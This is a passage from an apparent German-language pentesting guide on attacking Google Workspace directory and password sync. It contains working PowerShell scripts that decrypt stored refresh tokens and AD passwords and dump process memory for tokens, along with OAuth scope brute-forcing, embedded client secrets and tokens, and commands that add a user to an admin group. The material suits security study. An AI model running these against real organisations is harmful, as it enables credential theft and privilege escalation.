https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome" | tr '\n' ' ')

curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token
```
</details>

Einige Beispiele, die einige dieser Scopes verwenden:

<details>

<summary>https://www.googleapis.com/auth/userinfo.email &#x26; https://www.googleapis.com/auth/userinfo.profile</summary>
```bash
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/oauth2/v2/userinfo"

{
"id": "100203736939176354570",
"email": "hacktricks@example.com",
"verified_email": true,
"name": "John Smith",
"given_name": "John",
"family_name": "Smith",
"picture": "https://lh3.googleusercontent.com/a/ACg8ocKLvue[REDACTED]wcnzhyKH_p96Gww=s96-c",
"locale": "en",
"hd": "example.com"
}
```
</details>

<details>

<summary>https://www.googleapis.com/auth/admin.directory.user</summary>
```bash
# List users
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/admin/directory/v1/users?customer=<workspace_id>&maxResults=100&orderBy=email"

# Create user
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"primaryEmail": "newuser@hdomain.com",
"name": {
"givenName": "New",
"familyName": "User"
},
"password": "UserPassword123",
"changePasswordAtNextLogin": true
}' \
"https://www.googleapis.com/admin/directory/v1/users"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/drive</summary>
```bash
# List files
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?pageSize=10&fields=files(id,name,modifiedTime)&orderBy=name"
{
"files": [
{
"id": "1Z8m5ALSiHtewoQg1LB8uS9gAIeNOPBrq",
"name": "Veeam new vendor form 1 2024.docx",
"modifiedTime": "2024-08-30T09:25:35.219Z"
}
]
}

# Download file
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/<file-id>?alt=media" \
-o "DownloadedFileName.ext"

# Upload file
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/file.ext \
"https://www.googleapis.com/upload/drive/v3/files?uploadType=media"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/devstorage.read_write</summary>
```bash
# List buckets from a project
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b?project=<project-id>"

# List objects in a bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/<bucket-name>/o?maxResults=10&fields=items(id,name,size,updated)&orderBy=name"

# Upload file to bucket
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/yourfile.ext \
"https://www.googleapis.com/upload/storage/v1/b/<BUCKET_NAME>/o?uploadType=media&name=<OBJECT_NAME>"

# Download file from bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/BUCKET_NAME/o/OBJECT_NAME?alt=media" \
-o "DownloadedFileName.ext"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/spreadsheets</summary>
```bash
# List spreadsheets
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?q=mimeType='application/vnd.google-apps.spreadsheet'&fields=files(id,name,modifiedTime)&pageSize=100"

# Download as pdf
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/106VJxeyIsVTkixutwJM1IiJZ0ZQRMiA5mhfe8C5CxMc/export?mimeType=application/pdf" \
-o "Spreadsheet.pdf"

# Create spreadsheet
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"properties": {
"title": "New Spreadsheet"
}
}' \
"https://sheets.googleapis.com/v4/spreadsheets"

# Read data from a spreadsheet
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A1:C10"

# Update data in spreadsheet
curl -X PUT \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"range": "Sheet1!A2:C2",
"majorDimension": "ROWS",
"values": [
["Alice Johnson", "28", "alice.johnson@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A2:C2?valueInputOption=USER_ENTERED"

# Append data
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"values": [
["Bob Williams", "35", "bob.williams@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/SPREADSHEET_ID/values/Sheet1!A:C:append?valueInputOption=USER_ENTERED"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/ediscovery (Google Vault)</summary>

**Google Workspace Vault** ist ein Add-on f√ºr Google Workspace, das Werkzeuge f√ºr Datenaufbewahrung, Suche und Export f√ºr die Daten Ihrer Organisation bietet, die in Google Workspace-Diensten wie Gmail, Drive, Chat und mehr gespeichert sind.

* Ein **Matter** in Google Workspace Vault ist ein **Container**, der alle Informationen zu einem bestimmten Fall, einer Untersuchung oder einer rechtlichen Angelegenheit organisiert und gruppiert. Er dient als zentrale Anlaufstelle f√ºr die Verwaltung von **Holds**, **Searches** und **Exports**, die sich auf dieses spezielle Thema beziehen.
* Ein **Hold** in Google Workspace Vault ist eine **Erhaltungsma√ünahme**, die auf bestimmte Benutzer oder Gruppen angewendet wird, um die **L√∂schung oder √Ñnderung** ihrer Daten innerhalb der Google Workspace-Dienste zu **verhindern**. Holds stellen sicher, dass relevante Informationen w√§hrend eines rechtlichen Falls oder einer Untersuchung intakt und unver√§ndert bleiben.
```bash
# List matters
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters?pageSize=10"

# Create matter
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"name": "Legal Case 2024",
"description": "Matter for the upcoming legal case involving XYZ Corp.",
"state": "OPEN"
}' \
"https://vault.googleapis.com/v1/matters"

# Get specific matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>"

# List holds in a matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>/holds?pageSize=10"
```
More [API-Endpunkte in den Docs](https://developers.google.com/vault/reference/rest).

</details>

## GCDS - Google Cloud Directory Sync

Dies ist ein Tool, das verwendet werden kann, um **Ihre Active Directory-Benutzer und -Gruppen mit Ihrem Workspace zu synchronisieren** (und nicht umgekehrt zum Zeitpunkt dieses Schreibens).

Es ist interessant, weil es ein Tool ist, das die **Anmeldeinformationen eines Workspace-Superusers und eines privilegierten AD-Benutzers** erfordert. Daher k√∂nnte es m√∂glich sein, es auf einem Dom√§nenserver zu finden, der von Zeit zu Zeit Benutzer synchronisiert.

{% hint style="info" %}
Um ein **MitM** auf die **`config-manager.exe`**-Bin√§rdatei durchzuf√ºhren, f√ºgen Sie einfach die folgende Zeile in die Datei `config.manager.vmoptions` ein: **`-Dcom.sun.net.ssl.checkRevocation=false`**
{% endhint %}

{% hint style="success" %}
Beachten Sie, dass [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) in der Lage ist, **GCDS** zu erkennen, Informationen √ºber die Konfiguration zu erhalten und **sogar die Passw√∂rter und verschl√ºsselten Anmeldeinformationen**.
{% endhint %}

Beachten Sie auch, dass GCDS keine Passw√∂rter von AD zu Workspace synchronisiert. Wenn √ºberhaupt, generiert es einfach zuf√§llige Passw√∂rter f√ºr neu erstellte Benutzer in Workspace, wie Sie im folgenden Bild sehen k√∂nnen:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5780773316536156543-x.jpg" alt="" width="515"><figcaption></figcaption></figure>

### GCDS - Festplattentoken & AD-Anmeldeinformationen

Die Bin√§rdatei `config-manager.exe` (die Haupt-GCDS-Bin√§rdatei mit GUI) speichert standardm√§√üig die konfigurierten Active Directory-Anmeldeinformationen, das Aktualisierungstoken und den Zugriff in einer **xml-Datei** im Ordner **`C:\Program Files\Google Cloud Directory Sync`** in einer Datei namens **`Untitled-1.xml`**. Obwohl es auch im `Documents`-Ordner des Benutzers oder in **irgendeinem anderen Ordner** gespeichert werden k√∂nnte.

Dar√ºber hinaus enth√§lt die Registrierung **`HKCU\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\ui`** innerhalb des Schl√ºssels **`open.recent`** die Pfade zu allen k√ºrzlich ge√∂ffneten Konfigurationsdateien (xmls). Es ist also m√∂glich, **es zu √ºberpr√ºfen, um sie zu finden**.

Die interessantesten Informationen in der Datei w√§ren:
```xml
[...]
<loginMethod>OAUTH2</loginMethod>
<oAuth2RefreshToken>rKvvNQxi74JZGI74u68aC6o+3Nu1ZgVUYdD1GyoWyiHHxtWx+lbx3Nk8dU27fts5lCJKH/Gp1q8S6kEM2AvjQZN16MkGTU+L2Yd0kZsIJWeO0K0RdVaK2D9Saqchk347kDgGsQulJnuxU+Puo46+aA==</oAuth2RefreshToken>
<oAuth2Scopes>
<scope>https://www.google.com/m8/feeds/</scope>
<scope>https://www.googleapis.com/auth/admin.directory.group</scope>
<scope>https://www.googleapis.com/auth/admin.directory.orgunit</scope>
<scope>https://www.googleapis.com/auth/admin.directory.resource.calendar</scope>
<scope>https://www.googleapis.com/auth/admin.directory.user</scope>
<scope>https://www.googleapis.com/auth/admin.directory.userschema</scope>
<scope>https://www.googleapis.com/auth/apps.groups.settings</scope>
<scope>https://www.googleapis.com/auth/apps.licensing</scope>
<scope>https://www.googleapis.com/auth/plus.me</scope>
</oAuth2Scopes>
[...]
<hostname>192.168.10.23</hostname>
<port>389</port>
<basedn>dc=hacktricks,dc=local</basedn>
<authType>SIMPLE</authType>
<authUser>DOMAIN\domain-admin</authUser>
<authCredentialsEncrypted>XMmsPMGxz7nkpChpC7h2ag==</authCredentialsEncrypted>
[...]
```
Beachten Sie, wie das **refresh** **token** und das **password** des Benutzers mit **AES CBC** unter Verwendung eines zuf√§llig generierten Schl√ºssels und IV, die in **`HKEY_CURRENT_USER\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util`** gespeichert sind (wo auch immer die **`prefs`** Java-Bibliothek die Einstellungen speichert), in den String-Schl√ºsseln **`/Encryption/Policy/V2.iv`** und **`/Encryption/Policy/V2.key`** in base64 gespeichert sind.

<details>

<summary>Powershell-Skript zum Entschl√ºsseln des Refresh-Tokens und des Passworts</summary>
```powershell
# Paths and key names
$xmlConfigPath = "C:\Users\c\Documents\conf.xml"
$regPath = "SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util"
$ivKeyName = "/Encryption/Policy/V2.iv"
$keyKeyName = "/Encryption/Policy/V2.key"

# Open the registry key
try {
$regKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($regPath)
if (-not $regKey) {
Throw "Registry key not found: HKCU\$regPath"
}
}
catch {
Write-Error "Failed to open registry key: $_"
exit
}

# Get Base64-encoded IV and Key from the registry
try {
$ivBase64 = $regKey.GetValue($ivKeyName)
$ivBase64 = $ivBase64 -replace '/', ''
$ivBase64 = $ivBase64 -replace '\\', '/'
if (-not $ivBase64) {
Throw "IV not found in registry"
}
$keyBase64 = $regKey.GetValue($keyKeyName)
$keyBase64 = $keyBase64 -replace '/', ''
$keyBase64 = $keyBase64 -replace '\\', '/'
if (-not $keyBase64) {
Throw "Key not found in registry"
}
}
catch {
Write-Error "Failed to read registry values: $_"
exit
}
$regKey.Close()


# Decode Base64 IV and Key
$ivBytes = [Convert]::FromBase64String($ivBase64)
$keyBytes = [Convert]::FromBase64String($keyBase64)

# Read XML content
$xmlContent = Get-Content -Path $xmlConfigPath -Raw

# Extract Base64-encoded encrypted values using regex
$refreshTokenMatch = [regex]::Match($xmlContent, "<oAuth2RefreshToken>(.*?)</oAuth2RefreshToken>")
$refreshTokenBase64 = $refreshTokenMatch.Groups[1].Value

$encryptedPasswordMatch = [regex]::Match($xmlContent, "<authCredentialsEncrypted>(.*?)</authCredentialsEncrypted>")
$encryptedPasswordBase64 = $encryptedPasswordMatch.Groups[1].Value

# Decode encrypted values from Base64
$refreshTokenEncryptedBytes = [Convert]::FromBase64String($refreshTokenBase64)
$encryptedPasswordBytes = [Convert]::FromBase64String($encryptedPasswordBase64)

# Function to decrypt data using AES CBC
Function Decrypt-Data($cipherBytes, $keyBytes, $ivBytes) {
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.KeySize = 256
$aes.BlockSize = 128
$aes.Key = $keyBytes
$aes.IV = $ivBytes

$decryptor = $aes.CreateDecryptor()
$memoryStream = New-Object System.IO.MemoryStream
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
$cryptoStream.Write($cipherBytes, 0, $cipherBytes.Length)
$cryptoStream.FlushFinalBlock()
$plaintextBytes = $memoryStream.ToArray()

$cryptoStream.Close()
$memoryStream.Close()

return $plaintextBytes
}

# Decrypt the values
$refreshTokenBytes = Decrypt-Data -cipherBytes $refreshTokenEncryptedBytes -keyBytes $keyBytes -ivBytes $ivBytes
$refreshToken = [System.Text.Encoding]::UTF8.GetString($refreshTokenBytes)

$decryptedPasswordBytes = Decrypt-Data -cipherBytes $encryptedPasswordBytes -keyBytes $keyBytes -ivBytes $ivBytes
$decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decryptedPasswordBytes)

# Output the decrypted values
Write-Host "Decrypted Refresh Token: $refreshToken"
Write-Host "Decrypted Password: $decryptedPassword"
```
</details>

{% hint style="info" %}
Beachten Sie, dass es m√∂glich ist, diese Informationen zu √ºberpr√ºfen, indem Sie den Java-Code von **`DirSync.jar`** aus **`C:\Program Files\Google Cloud Directory Sync`** durchsuchen und nach der Zeichenfolge `exportkeys` suchen (da dies der CLI-Parameter ist, den die Bin√§rdatei `upgrade-config.exe` erwartet, um die Schl√ºssel auszugeben).
{% endhint %}

Anstatt das PowerShell-Skript zu verwenden, ist es auch m√∂glich, die Bin√§rdatei **`:\Program Files\Google Cloud Directory Sync\upgrade-config.exe`** mit dem Parameter `-exportKeys` zu verwenden und den **Key** und **IV** aus der Registrierung in Hexadezimal zu erhalten und dann einfach CyberChef mit AES/CBC sowie diesem Schl√ºssel und IV zu verwenden, um die Informationen zu entschl√ºsseln.

### GCDS - Tokens aus dem Speicher dumpen

Genau wie bei GCPW ist es m√∂glich, den Speicher des Prozesses `config-manager.exe` (das ist der Name der Haupt-Bin√§rdatei von GCDS mit GUI) zu dumpen, und Sie werden in der Lage sein, Refresh- und Access-Token zu finden (wenn sie bereits generiert wurden).\
Ich sch√§tze, Sie k√∂nnten auch die konfigurierten AD-Anmeldeinformationen finden.

<details>

<summary>Dump config-manager.exe Prozesse und nach Tokens suchen</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "config-manager" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

### GCDS - Zugriffstoken aus Aktualisierungstoken generieren

Mit dem Aktualisierungstoken ist es m√∂glich, Zugriffstoken zu generieren, indem es zusammen mit der Client-ID und dem Client-Geheimnis verwendet wird, die im folgenden Befehl angegeben sind:
```bash
curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCDS - Scopes

{% hint style="info" %}
Beachten Sie, dass es selbst mit einem Refresh-Token nicht m√∂glich ist, einen beliebigen Scope f√ºr das Access-Token anzufordern, da Sie nur die **Scopes anfordern k√∂nnen, die von der Anwendung unterst√ºtzt werden, in der Sie das Access-Token generieren**.

Au√üerdem ist das Refresh-Token nicht in jeder Anwendung g√ºltig.
{% endhint %}

Standardm√§√üig hat GCSD nicht als Benutzer Zugriff auf jeden m√∂glichen OAuth-Scope. Mit dem folgenden Skript k√∂nnen wir die Scopes finden, die mit dem `refresh_token` verwendet werden k√∂nnen, um ein `access_token` zu generieren:

<details>

<summary>Bash-Skript zum Brute-Forcen von Scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03PR0VQOSCjS1CgYIARAAGAMSNwF-L9Ir5b_vOaCmnXzla0nL7dX7TJJwFcvrfgDPWI-j19Z4luLpYfLyv7miQyvgyXjGEXt-t0A" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

Und dies ist die Ausgabe, die ich zum Zeitpunkt des Schreibens erhalten habe:
```
https://www.googleapis.com/auth/admin.directory.group
https://www.googleapis.com/auth/admin.directory.orgunit
https://www.googleapis.com/auth/admin.directory.resource.calendar
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/admin.directory.userschema
https://www.googleapis.com/auth/apps.groups.settings
https://www.googleapis.com/auth/apps.licensing
https://www.googleapis.com/auth/contacts
```
#### Erstellen Sie einen Benutzer und f√ºgen Sie ihn der Gruppe `gcp-organization-admins` hinzu, um zu versuchen, in GCP zu eskalieren.
```bash
# Create new user
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/users' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"primaryEmail": "deleteme@domain.com",
"name": {
"givenName": "Delete",
"familyName": "Me"
},
"password": "P4ssw0rdStr0ng!",
"changePasswordAtNextLogin": false
}'

# Add to group
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/groups/gcp-organization-admins@domain.com/members' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"email": "deleteme@domain.com",
"role": "OWNER"
}'

# You could also change the password of a user for example
```
{% hint style="danger" %}
Es ist nicht m√∂glich, dem neuen Benutzer die Super Admin-Rolle zu geben, da das **Aktualisierungstoken nicht √ºber gen√ºgend Berechtigungen verf√ºgt**, um die erforderlichen Privilegien zu gew√§hren.
{% endhint %}

## Admin Directory Sync

Der Hauptunterschied zwischen dieser Methode zur Synchronisierung von Benutzern mit GCDS besteht darin, dass GCDS manuell mit einigen Bin√§rdateien durchgef√ºhrt wird, die Sie herunterladen und ausf√ºhren m√ºssen, w√§hrend **Admin Directory Sync serverlos** von Google in [https://admin.google.com/ac/sync/externaldirectories](https://admin.google.com/ac/sync/externaldirectories) verwaltet wird.

Zum Zeitpunkt des Schreibens ist dieser Dienst in der Beta-Phase und unterst√ºtzt 2 Arten der Synchronisierung: Von **Active Directory** und von **Azure Entra ID:**

* **Active Directory:** Um dies einzurichten, m√ºssen Sie **Google Zugriff auf Ihre Active Directory-Umgebung gew√§hren**. Da Google nur Zugriff auf GCP-Netzwerke (√ºber **VPC-Connectoren**) hat, m√ºssen Sie einen Connector erstellen und dann Ihr AD √ºber diesen Connector verf√ºgbar machen, indem Sie es in VMs im GCP-Netzwerk haben oder Cloud VPN oder Cloud Interconnect verwenden. Dann m√ºssen Sie auch **Anmeldeinformationen** eines Kontos mit Lesezugriff auf das Verzeichnis und ein **Zertifikat** bereitstellen, um √ºber **LDAPS** zu kommunizieren.
* **Azure Entra ID:** Um dies zu konfigurieren, m√ºssen Sie sich einfach mit einem Benutzer mit Lesezugriff √ºber das Entra ID-Abonnement in einem von Google angezeigten Pop-up bei Azure anmelden, und Google wird das Token mit Lesezugriff √ºber Entra ID speichern.

Sobald es korrekt konfiguriert ist, erm√∂glichen beide Optionen die **Synchronisierung von Benutzern und Gruppen mit Workspace**, jedoch nicht die Konfiguration von Benutzern und Gruppen von Workspace zu AD oder EntraID.

Weitere Optionen, die w√§hrend dieser Synchronisierung erm√∂glicht werden, sind:

* Senden Sie eine E-Mail an die neuen Benutzer, um sich anzumelden
* √Ñndern Sie automatisch ihre E-Mail-Adresse in die von Workspace verwendete. Wenn Workspace also `@hacktricks.xyz` verwendet und EntraID-Benutzer `@carloshacktricks.onmicrosoft.com` verwenden, wird `@hacktricks.xyz` f√ºr die im Konto erstellten Benutzer verwendet.
* W√§hlen Sie die **Gruppen aus, die die Benutzer enthalten**, die synchronisiert werden sollen.
* W√§hlen Sie **Gruppen** zur Synchronisierung und Erstellung in Workspace aus (oder geben Sie an, alle Gruppen zu synchronisieren).

### Von AD/EntraID -> Google Workspace (& GCP)

Wenn Sie es schaffen, ein AD oder EntraID zu kompromittieren, haben Sie die volle Kontrolle √ºber die Benutzer und Gruppen, die mit Google Workspace synchronisiert werden.\
Beachten Sie jedoch, dass die **Passw√∂rter**, die die Benutzer m√∂glicherweise in Workspace verwenden, **die gleichen oder unterschiedliche sein k√∂nnten**.

#### Angreifen von Benutzern

Wenn die Synchronisierung erfolgt, kann sie **alle Benutzer aus AD oder nur die aus einer bestimmten OU** oder nur die **Benutzer, die Mitglieder bestimmter Gruppen in EntraID sind**, synchronisieren. Das bedeutet, dass Sie zuerst herausfinden m√ºssen, welche Benutzer synchronisiert werden, um einen synchronisierten Benutzer anzugreifen (oder einen neuen zu erstellen, der synchronisiert wird).

* Benutzer k√∂nnten **das Passwort von AD oder EntraID wiederverwenden oder nicht**, aber das bedeutet, dass Sie die **Passw√∂rter der Benutzer kompromittieren m√ºssen, um sich anzumelden**.
* Wenn Sie Zugriff auf die **E-Mails** der Benutzer haben, k√∂nnten Sie **das Workspace-Passwort eines vorhandenen Benutzers √§ndern** oder **einen neuen Benutzer erstellen**, warten, bis er synchronisiert wird, und das Konto einrichten.

Sobald Sie auf den Benutzer in Workspace zugreifen, k√∂nnten ihm einige **Berechtigungen standardm√§√üig** zugewiesen werden.

#### Angreifen von Gruppen

Sie m√ºssen auch zuerst herausfinden, welche Gruppen synchronisiert werden. Obwohl die M√∂glichkeit besteht, dass **ALLE** Gruppen synchronisiert werden (da Workspace dies zul√§sst).

{% hint style="info" %}
Beachten Sie, dass selbst wenn die Gruppen und Mitgliedschaften in Workspace importiert werden, die **Benutzer, die nicht in der Benutzersynchronisierung synchronisiert werden, nicht** w√§hrend der Gruppensynchronisierung erstellt werden, selbst wenn sie Mitglieder einer der synchronisierten Gruppen sind.
{% endhint %}

Wenn Sie wissen, welche Gruppen aus Azure **Berechtigungen in Workspace oder GCP zugewiesen bekommen**, k√∂nnten Sie einfach einen kompromittierten Benutzer (oder neu erstellten) in diese Gruppe hinzuf√ºgen und diese Berechtigungen erhalten.

Es gibt eine weitere M√∂glichkeit, bestehende privilegierte Gruppen in Workspace auszunutzen. Zum Beispiel hat die Gruppe `gcp-organization-admins@<workspace.email>` normalerweise hohe Privilegien √ºber GCP.

Wenn die Synchronisierung von beispielsweise EntraID zu Workspace **so konfiguriert ist, dass die Domain** des importierten Objekts **mit der E-Mail von Workspace ersetzt wird**, wird es einem Angreifer m√∂glich sein, die Gruppe `gcp-organization-admins@<entraid.email>` in EntraID zu erstellen, einen Benutzer in dieser Gruppe hinzuzuf√ºgen und zu warten, bis die Synchronisierung aller Gruppen erfolgt.\
**Der Benutzer wird der Gruppe `gcp-organization-admins@<workspace.email>` hinzugef√ºgt und eskaliert die Privilegien in GCP.**

### Von Google Workspace -> AD/EntraID

Beachten Sie, dass Workspace Anmeldeinformationen mit nur Lesezugriff auf AD oder EntraID ben√∂tigt, um Benutzer und Gruppen zu synchronisieren. Daher ist es nicht m√∂glich, Google Workspace auszunutzen, um √Ñnderungen in AD oder EntraID vorzunehmen. **Das ist momentan nicht m√∂glich.**

Ich wei√ü auch nicht, wo Google die AD-Anmeldeinformationen oder das EntraID-Token speichert, und Sie **k√∂nnen sie nicht wiederherstellen, indem Sie die Synchronisierung neu konfigurieren** (sie erscheinen nicht im Webformular, Sie m√ºssen sie erneut angeben). Es k√∂nnte jedoch m√∂glich sein, die aktuelle Funktionalit√§t √ºber das Web auszunutzen, um **Benutzer und Gruppen aufzulisten**.

## GPS - Google Password Sync

Dies ist die Bin√§rdatei und der Dienst, den Google anbietet, um die **Passw√∂rter der Benutzer zwischen dem AD** und Workspace synchronisiert zu halten. Jedes Mal, wenn ein Benutzer sein Passwort im AD √§ndert, wird es an Google gesendet.

Es wird in `C:\Program Files\Google\Password Sync` installiert, wo Sie die Bin√§rdatei `PasswordSync.exe` finden, um sie zu konfigurieren, und `password_sync_service.exe` (der Dienst, der weiterhin l√§uft).

### GPS - Konfiguration

Um diese Bin√§rdatei (und den Dienst) zu konfigurieren, ist es erforderlich, **einen Super Admin-Hauptbenutzer in Workspace Zugriff zu gew√§hren**:

* Anmeldung √ºber **OAuth** mit Google, und dann wird **ein Token im Registrierungseditor (verschl√ºsselt) gespeichert**
* Nur verf√ºgbar auf Dom√§nencontrollern mit GUI
* Bereitstellung von **Service Account-Anmeldeinformationen von GCP** (json-Datei) mit Berechtigungen zur **Verwaltung der Workspace-Benutzer**
